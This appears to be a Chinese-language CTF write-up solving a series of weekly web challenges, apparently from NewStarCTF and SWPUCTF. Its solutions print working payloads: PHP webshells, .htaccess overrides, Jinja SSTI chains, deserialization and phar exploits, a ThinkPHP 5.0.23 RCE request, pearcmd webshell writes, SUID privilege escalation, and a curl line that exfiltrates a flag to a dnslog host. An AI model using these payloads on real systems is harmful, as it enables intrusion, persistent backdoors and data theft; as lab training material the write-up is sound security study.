## Week1

### ErrorFlask

题目

![image-20231019124225948](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019124225948.png)

```
?number1=1&number2=2
```

提示回显

![image-20231019124424685](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019124424685.png)

用`{{}}`包裹参数进行传参，回显了一个错误界面，flag也出来了

![image-20231019124641860](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019124641860.png)

### Begin of PHP

```php
if($flag1){
    echo "=Level 2=<br>";
    if(isset($_POST['key3'])){
        if(md5($_POST['key3']) === sha1($_POST['key3'])){
            $flag2 = True;
        }
    }else{
        die("nope,this is level 2");
    }
}
```

```
md5()，sha1()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，也就是相等的。key3[]=1
```

```php
if($flag2){
    echo "=Level 3=<br>";
    if(isset($_GET['key4'])){
        if(strcmp($_GET['key4'],file_get_contents("/flag")) == 0){
            $flag3 = True;
        }else{
            die("nope,this is level 3");
        }
    }
}
```

```
strcmp()函数用于比较两个字符串并根据比较结果返回整数。基本形式为strcmp(str1,str2)，若str1=str2，则返回零；若str1<str2，则返回负数；若str1>str2，则返回正数。
```

这个strcmp()函数传入数组的话，直接会返回一个0。`key4[]=1`

```php
if($flag4){
    echo "=Level 5=<br>";
    extract($_POST);
    foreach($_POST as $var){
        if(preg_match("/[a-zA-Z0-9]/",$var)){
            die("nope,this is level 5");
        }
    }
    if($flag5){
        echo file_get_contents("/flag");
    }else{
        die("nope,this is level 5");
    }
}
```

我们只需要将true赋值给flag5，但是不能有大小写字母和数字，我们可以进行取反

```php
<?php
$a = 'true';
echo urlencode(~$a);
?> // flag5=(~%8B%8D%8A%9A)()
```

preg_match() 不接受数组作为参数，只接受字符串。

还可以数组进行绕过，`flag5[]=true`

### R!C!E!

```php
 <?php
highlight_file(__FILE__);
if(isset($_POST['password'])&&isset($_POST['e_v.a.l'])){
    $password=md5($_POST['password']);
    $code=$_POST['e_v.a.l'];
    if(substr($password,0,6)==="c4d038"){
        if(!preg_match("/flag|system|pass|cat|ls/i",$code)){
            eval($code);
        }
    }
}
```

审计代码

```
password的MD5值的前六位是c4d038
e_v.a.l的值不能是flag那些字符
```

发现`114514`的MD5值的前六位是c4d038，所以password=114514

在post传参时，变量名里的点和空格是非法字符，会被转化为`_`

这里有一个漏洞，如果变量有`[`，它会被转换成`_`,但中括号后面的非法字符就不会被转变

我们传的变量名是`e[v.a.l`

payload：`password=114514&e[v.a.l=eval($_POST[1]);&1=system('cat /flag');`

其他姿势：`password=114514&e[v.a.l=echo `nl /f* `;`

搜集了一些与cat命令差不多的命令

```
more:一页一页的显示档案内容
head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容
sort:可以查看
uniq:可以查看
strings:可以查看
rev:反过来看
```

### EasyLogin

就是一个弱口令爆破，它的密码会进行md5加密

![image-20231019173854276](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019173854276.png)

在爆破的时候，设置一下

![image-20231019174042511](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019174042511.png)

![image-20231019174238726](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019174238726.png)

![image-20231019174527979](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019174527979.png)

## Week2

### include 0。0

```php
 <?php
highlight_file(__FILE__);
// FLAG in the flag.php
$file = $_GET['file'];
if(isset($file) && !preg_match('/base|rot/i',$file)){
    @include($file);
}else{
    die("nope");
}
?>
```

文件包含漏洞，过滤了base和rot，换一个过滤器就可以

```php
php://filter/convert.iconv.utf-8.utf-16/resource=flag.php
```

### R!!C!!E!!

题目

![image-20231019180414346](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019180414346.png)

说是泄露了信息，用githack进行恢复

![image-20231019180656607](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019180656607.png)

有一个`bo0g1pop.php`

```
<?php
highlight_file(__FILE__);
if (';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['star'])) {
    if(!preg_match('/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i',$_GET['star'])){
        eval($_GET['star']);
    }
}
```

![image-20231019181017538](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019181017538.png)

如果传进去的值是传进去的值是字符串接一个`()`，那么字符串就会被替换为空。如果（递归）替换后的字符串只剩下`;`，代码就会被执行

```php
getallheaders() //取出所有http请求头信息，返回一个数组
array_flip() //函数用于反转/交换数组中所有的键名以及它们关联的键值
array_rand() //函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组
```

![image-20231019183349732](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231019183349732.png)

### Upload again!

上传图片一句话木马

```php
<?php eval($_POST[1]); ?>
```

发现被过滤了

```javascript
GIF89a
<script language="php">
eval($_POST['a']);
</script>
```

上传`.htaccess`

```
<FilesMatch "3.png">
SetHandler application/x-httpd-php
</FilesMatch>
```

```php
SetHandler application/x-httpd-php //所有上传文件解析为php类型
```

上传成功后就可以进行传参

### [SWPUCTF 2023 秋季新生赛]RCE-PLUS

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
function strCheck($cmd)
{
    if(!preg_match("/\;|\&|\\$|\x09|\x26|more|less|head|sort|tail|sed|cut|awk|strings|od|php|ping|flag/i", $cmd)){
        return($cmd);
    }
    else{
        die("i hate this");      
      }
}
$cmd=$_GET['cmd'];
strCheck($cmd);
shell_exec($cmd);
?>
```

```php
//无回显的函数，需要echo进行输出
shell_exec()
exec()
//有回显的函数
passthru()
system()
```

姿势一：

直接利用`>`直接输出结果到文件

payload:

```
ls />1
cat /fl*>1
```

姿势二：

利用带外出flag

```
命令：
curl ``.域名
payload:
curl `cat /fl*`.k8cg5h.dnslog.cn
```

![image-20231023224311602](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231023224311602.png)

### [SWPUCTF 2023 秋季新生赛]If_else

```php
 <?php
    $a=false;
    $b=false;
    if(你提交的部分将会被写至这里)
    {$a=true;}
    else
    {$b=true;}
    if($a===true&&$b===true)
    eval(system(cat /flag));
?>
```

payload:

```
check=1==1) {system('cat /fl*');} /*
```

直接执行代码，用/*将后面代码进行注释

## Week3

### Include 🍐

```php
 <?php
    error_reporting(0);
    if(isset($_GET['file'])) {
        $file = $_GET['file'];
        
        if(preg_match('/flag|log|session|filter|input|data/i', $file)) {
            die('hacker!');
        }
        include($file.".php");
        # Something in phpinfo.php!
    }
    else {
        highlight_file(__FILE__);
    }
?>
```

提示看`phpinfo.php`

![image-20231024215224955](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231024215224955.png)

![image-20231024215239939](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231024215239939.png)

发现register_argc_argv是开启状态，搜索得到是要利用pearcmd命令执行

[具体点这里](https://www.cnblogs.com/Yu--/p/15788689.html)

payload：

```php
?file=/usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_POST['a'])?>+/tmp/1.php
```

各个参数用`+`分开，并传参

这里要用burp及进行传参，用hackbar`>`这些字符会被url编码

![image-20231024220315095](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231024220315095.png)

上传成功后，我们访问

```
?file=/tmp/1  //题目后面是带着.php的
```

然后进行rce就行了

![image-20231024221039650](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231024221039650.png)

### R!!!C!!!E!!!

```php
 <?php
highlight_file(__FILE__);
class minipop{
    public $code;
    public $qwejaskdjnlka;
    public function __toString()
    {
        if(!preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){
            exec($this->code);
        }
        return "alright";
    }
    public function __destruct()
    {
        echo $this->qwejaskdjnlka;
    }
}
if(isset($_POST['payload'])){
    //wanna try?
    unserialize($_POST['payload']);
}
```

这个反序列化直接进行触发tostring就可以

```php
<?php
class minipop
{
    public $code = "cat /flag_is_h3eeere |script 1";  //cat /flag_is_h3eeere | t''ee b
    public $qwejaskdjnlka;
}
$a = new minipop();
$b = new minipop();
$b->qwejaskdjnlka = $a;
echo serialize($b);
```

命令：

```php
ls / | t''ee b
cat /flag_is_h3eeere | t''ee b
cat /flag_is_h3eeere |script 1
```

```
Linux tee命令用于读取标准输入的数据，并将其内容输出成文件。
tee file1 file2 //复制文件
ls /|tee 1.txt //命令输出
```

用这个`cat /flag_is_h3eeere |script 1`将文件内容写进`1`文件，访问1就可以

![image-20231024222024890](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231024222024890.png)

### GenShin

这里GET传参，传什么返回什么，应该是ssti模板注入

![image-20231031220913440](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231031220913440.png)

用`{{}}`发现被过滤了,这里还可以用`{% %}`也可以执行命令

```
看一下子类
{%print("".__class__.__mro__[1].__subclasses__())%}
找一下能用的模板<class 'os._wrap_close'>
然后找它的位置，是132
```

![image-20231031222536385](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231031222536385.png)

```
接着用__init__重载函数，发现被过滤了可以用["__in"+"it__"]，这里发现单引号也被过滤了，用双引号，中括号，大括号
然后再用__goblas__,这里用popen执行命令，这里popen也是被过滤掉了用+进行拼接绕过["po"+"pen"]
```

![image-20231031223425625](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231031223425625.png)

最终payload：

```
{%print({}.__class__.__mro__[1].__subclasses__()[132]["__in"+"it__"]["__globals__"]["po"+"pen"]("cat /flag").read())%}
```

官方payload：

```
{% print(get_flashed_messages.__globals__.os["pop"+"en"]("cat /flag").read()) %}
get_flashed_messages这个内置函数没有被过滤
```

## Week4

### 逃

```php
<?php
highlight_file(__FILE__);
function waf($str){
    return str_replace("bad","good",$str);
}

class GetFlag {
    public $key;
    public $cmd = "whoami";
    public function __construct($key)
    {
        $this->key = $key;
    }
    public function __destruct()
    {
        system($this->cmd);
    }
}
unserialize(waf(serialize(new GetFlag($_GET['key']))));
```

有`str_replace`函数，这道题是php反序列化字符串逃逸增多问题

首先构造序列化字符串

```
O:7:"GetFlag":2:{s:3:"key";N;s:3:"cmd";s:4:"ls /";}
```

我们需要逃逸`s:3:"cmd";s:4:"ls /";}`，为了构造闭合，在前面添加`";`

现在我们需要逃逸的是`";s:3:"cmd";s:4:"ls /";}`，长度是24

因为bad替换成good增加一个字符，所以我们需要输入24个bad

同样，`";s:3:"cmd";s:9:"cat /flag";}`29个字符

payload：

```
key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:9:"cat /flag";}
```

![image-20231031230621719](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231031230621719.png)

### More Fast

#### 源代码：

```php
 <?php
highlight_file(__FILE__);

class Start{
    public $errMsg;
    public function __destruct() {
        die($this->errMsg);
    }
}

class Pwn{
    public $obj;
    public function __invoke(){
        $this->obj->evil();
    }
    public function evil() {
        phpinfo();
    }
}

class Reverse{
    public $func;
    public function __get($var) {
        ($this->func)();
    }
}

class Web{
    public $func;
    public $var;
    public function evil() {
        if(!preg_match("/flag/i",$this->var)){
            ($this->func)($this->var);
        }else{
            echo "Not Flag";
        }
    }
}
class Crypto{
    public $obj;
    public function __toString() {
        $wel = $this->obj->good;
        return "NewStar";
    }
}
class Misc{
    public function evil() {
        echo "good job but nothing";
    }
}
$a = @unserialize($_POST['fast']);
throw new Exception("Nope");
Fatal error: Uncaught Exception: Nope in /var/www/html/index.php:55 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 55
```

#### 考点：

主要是`Fast destruct`

*1、PHP中，如果单独执行unserialize函数进行常规的反序列化，那么被反序列化后的整个对象的生命周期就仅限于这个函数执行的生命周期，当这个函数执行完毕，这个类就没了，在有析构函数的情况下就会执行它。*

*2、PHP中，如果用一个变量接住反序列化函数的返回值，那么被反序列化的对象其生命周期就会变长，由于它一直都存在于这个变量当中，那么在PHP脚本走完流程之后，这个对象才会被销毁，在有析构函数的情况下就会将其执行。*

[从一道题看fast_destruct](https://wh1tecell.top/2021/11/11/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9C%8Bfast-destruct/)

#### 解题

首先构造pop链

```php
<?php
class Start{
    public $errMsg;
    public function __destruct() {
        die($this->errMsg);
    }
}
class Pwn{
    public $obj;
    public function __invoke(){
        $this->obj->evil();
    }
    public function evil() {
        phpinfo();
    }
}
class Reverse{
    public $func;
    public function __get($var) {
        ($this->func)();
    }
}
class Web{
    public $func = 'system';
    public $var = 'cat /fl*';
    public function evil() {
        if(!preg_match("/flag/i",$this->var)){
            ($this->func)($this->var);
        }else{
            echo "Not Flag";
        }
    }
}
class Crypto{
    public $obj;
    public function __toString() {
        $wel = $this->obj->good;
        return "NewStar";
    }
}
class Misc{
    public function evil() {
        echo "good job but nothing";
    }
}
$a = new Start();
$a->errMsg = new Crypto();
$a->errMsg->obj = new Reverse();
$a->errMsg->obj->func = new Pwn();
$a->errMsg->obj->func->obj = new Web();
$b = serialize($a);
echo $b;
```

payload：

```
O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:8:"cat /fl*";}}}}}
```

传进去回显一个报错

![image-20231101202055155](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231101202055155.png)

这时候我们需要快速触发__destruct

姿势一：

修改序列化属性个数，1->2，类似__wakeup的绕过

姿势二：

去掉生成的序列化字符串最后的一个大括号

### So Baby RCE

源代码

```shell
<?php
error_reporting(0);
if(isset($_GET["cmd"])){
    if(preg_match('/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\'|\]|"|<|>|`|\/| |\\\\|\*/i',$_GET["cmd"])){
       echo "Don't Hack Me";
    }else{
        system($_GET["cmd"]);
    }
}else{
    show_source(__FILE__);
}
```

过滤了很多函数和符号，可以利用%0A多命令切换目录，不断切换到根目录，进行读取flag

payload

可以用rev，uniq，sort

```
cmd=%0Acd${IFS}..%0Acd${IFS}..%0Acd${IFS}..%0Als
cmd=%0Acd${IFS}..%0Acd${IFS}..%0Acd${IFS}..%0Auniq${IFS}ffff?lllaaaaggggg
```

### UnserializeThree

源代码

```php
<?php
highlight_file(__FILE__);
class Evil{
    public $cmd;
    public function __destruct()
    {
        if(!preg_match("/>|<|\?|php|".urldecode("%0a")."/i",$this->cmd)){
            //Same point ,can you bypass me again?
            eval("#".$this->cmd);
        }else{
            echo "No!";
        }
    }
}

file_exists($_GET['file']); 
```

还有一个上传页面

> file_exists — 检查文件或目录是否存在
>
> file_exists()函数可触发 phar反序列化

换行符被过滤了，还可以用回车符%0d

payload

```php
<?php
class Evil{
    public $cmd;
}

$e = new Evil();
$e->cmd = urldecode("%0d").'system("tac /f*");';
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($e);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```

主要修改的就是setMetadata的内容

上传时，发现phar后缀不能上传，修改成png后缀，其实修改成什么都无所谓

```
?file=phar://upload/ed54ee58cd01e120e27939fe4a64fa92.png
```

### flask disk

访问admin manage发现要输入pin码，说明flask开启了debug模式。所以只需要上传一个能rce的app.py文件把原来的覆盖就可以了

```python
from flask import Flask,request
import os
app = Flask(__name__)
@app.route('/')
def index():    
    try:        
        cmd = request.args.get('cmd')        
        data = os.popen(cmd).read()        
        return data    
    except:        
        pass    
        
    return "1"
if __name__=='__main__':    
    app.run(host='0.0.0.0',port=5000,debug=True)
```

payload

```
cmd=cat /f*
```

### PharOne

class.php

```php
 <?php
highlight_file(__FILE__);
class Flag{
    public $cmd;
    public function __destruct()
    {
        @exec($this->cmd);
    }
}
@unlink($_POST['file']); 
```

有上传文件的地方，还有unlink函数，说明这是一道phar反序列化的题目

```php
<?php

class Flag{
    public $cmd = "echo '<?=eval(\$_POST[1]);?>'>/var/www/html/2.php";
}

$phar = new Phar("1.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");

$o = new Flag();
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```

生成phar文件

上传发现提示，Hacker?

修改成png后缀

提示过滤了__HALT_COMPILER

```
!preg_match("/__HALT_COMPILER/i",FILE_CONTENTS) 
```

使用gzip进行压缩，上传成功

payload

```
file=phar://upload/321532365639f31b3b9f8ea8be0c6be2.png
```

访问2.php即可

## Week5

### So Baby RCE Again

源代码

```php
<?php
error_reporting(0);
if(isset($_GET["cmd"])){
    if(preg_match('/bash|curl/i',$_GET["cmd"])){
        echo "Hacker!";
    }else{
        shell_exec($_GET["cmd"]);
    }
}else{
    show_source(__FILE__);
}
```

无回显RCE

```
首先看一下目录
cmd=ls / | tee 1
发现
ffll444aaggg
尝试读取，读取不出来
写个木马吧
cmd=echo '<?php eval($_POST[1]);?>' > 1.php
蚁剑连接
```

没有查看权限

![image-20240303174012402](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240303174012402.png)

接着进行提权

```
查找一下suid权限的文件
cmd=find / -type f -perm -4000 2>/dev/null | tee 1
/bin/date
/bin/mount
/bin/su
/bin/umount
```

利用date进行提权

```
date -f ffll444aaggg 可以读取文件
或
cmd=date -f /ffll444aaggg 2>1 查看1文件
```

![image-20240303174826909](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240303174826909.png)

### Unserialize Again

访问pairing.php

```php
 <?php
highlight_file(__FILE__);
error_reporting(0);  
class story{
    private $user='admin';
    public $pass;
    public $eating;
    public $God='false';
    public function __wakeup(){
        $this->user='human';
        if(1==1){
            die();
        }
        if(1!=1){
            echo $fffflag;
        }
    }
    public function __construct(){
        $this->user='AshenOne';
        $this->eating='fire';
        die();
    }
    public function __tostring(){
        return $this->user.$this->pass;
    }
    public function __invoke(){
        if($this->user=='admin'&&$this->pass=='admin'){
            echo $nothing;
        }
    }
    public function __destruct(){
        if($this->God=='true'&&$this->user=='admin'){
            system($this->eating);
        }
        else{
            die('Get Out!');
        }
    }
}                 
if(isset($_GET['pear'])&&isset($_GET['apple'])){
    // $Eden=new story();
    $pear=$_GET['pear'];
    $Adam=$_GET['apple'];
    $file=file_get_contents('php://input');
    file_put_contents($pear,urldecode($file));
    file_exists($Adam);
}
else{
    echo '多吃雪梨';
}
```

> 思路：
>
> 给的上传是假的，不能上传
>
> 我们用php://input上传
>
> 然后用file_exists触发phar反序列化
>
> 非预期：直接上传php文件就行

```php
<?php

class story{
    public $eating = 'cat /f*';
    public $God='true';
}

$phar = new Phar("1.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$o = new story();
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();

echo (file_get_contents('1.phar'));
```

这时还不行，还需要绕过wakeup函数，将2改成3

![image-20240319202246183](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240319202246183.png)

我们打开文件将2改成了3，文件内容改变了，我们需要重新进行签名

```python
from hashlib import sha1

with open("1.phar",'rb') as f:
   text = f.read()
   main = text[:-28]        #正文部分(除去最后28字节) 获取要签名的数据（s）
   end = text[-8:]		  #最后八位也是不变的 获取签名类型和GBMB标识（h）
   new_sign = sha1(main).digest() # 对要签名的数据进行SHA-1哈希计算，并将原始数据、签名和类型/标识拼接成新的数据newf
   new_phar = main + new_sign + end
   open("hack.phar",'wb').write(new_phar)     #将新生成的内容以二进制方式覆盖写入原来的phar文件
```

生成的hack.phar就是我们要的，上传即可

payload

```http
POST /pairing.php?pear=1.phar&apple=phar://1.phar HTTP/1.1
Host: ac60fca3-8ea0-4508-92de-e38171dcd42d.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://ac60fca3-8ea0-4508-92de-e38171dcd42d.node5.buuoj.cn:81/pairing.php?pear=1.php
Cookie: looklook=pairing.php
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 449

%3C%3Fphp%20__HALT_COMPILER%28%29%3B%20%3F%3E%0D%0Av%00%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00%40%00%00%00O%3A5%3A%22story%22%3A3%3A%7Bs%3A6%3A%22eating%22%3Bs%3A7%3A%22cat%20/f%2A%22%3Bs%3A3%3A%22God%22%3Bs%3A4%3A%22true%22%3B%7D%08%00%00%00test.txt%04%00%00%00%EF%BF%BD%7F%EF%BF%BDe%04%00%00%00%0C~%7F%D8%B6%01%00%00%00%00%00%00test%EF%BF%BD%5D%EF%BF%BD%1DGCj%3E%EF%BF%BD%EF%BF%BD%8B%29C_%1Dl%E293M%A6%E1AG2%C7%1E%87%B8%DD%02%00%00%00GBMB
```

![image-20240319202922780](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240319202922780.png)

### Final

> ThinkPHP V5，这题是Thinkphp5.0.23 rce漏洞

kali上也能搜得到

![image-20240319210745415](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240319210745415.png)

我们就利用这个漏洞打吧

```http
POST /index.php?s=captcha HTTP/1.1
Host: 6f18a5ea-572c-45a9-aa83-c5e4239a4274.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1
```

这里system被禁用了，用不了，phpinfo还是可以出的

接着我们写个shell

```
_method=__construct&filter[]=exec&method=get&server[REQUEST_METHOD]=echo '<?php eval($_POST['cmd']);?>' > /var/www/public/1.php
```

蚁剑连上，flag是没有权限的

![image-20240319211124078](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240319211124078.png)

尝试suid进行提权

```
find / -type f -perm -4000 2>/dev/null
```

![image-20240319211424296](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240319211424296.png)

利用cp

/dev/stdout就是标准输出

```
cp /flag_dd3f6380aa0d /dev/stdout
```

![image-20240319211510379](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240319211510379.png)

### 4-复盘

给了源码

```php
<?php 
        if (isset($_GET['page'])) {
          $page ='pages/' .$_GET['page'].'.php';

        }else{
          $page = 'pages/dashboard.php';
        }
        if (file_exists($page)) {
          require_once $page; 
        }else{
          require_once 'pages/error_page.php';
        }
 ?>
```

存在目录穿越漏洞，利用pearcmd.php（和week3的include相似）

payload

```
page=../../../../usr/local/lib/php/pearcmd&+config-create+/<?=@eval($_POST['a'])?>+/var/www/html/1.php
```

接着进行suid提权

![image-20240321120153032](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240321120153032.png)

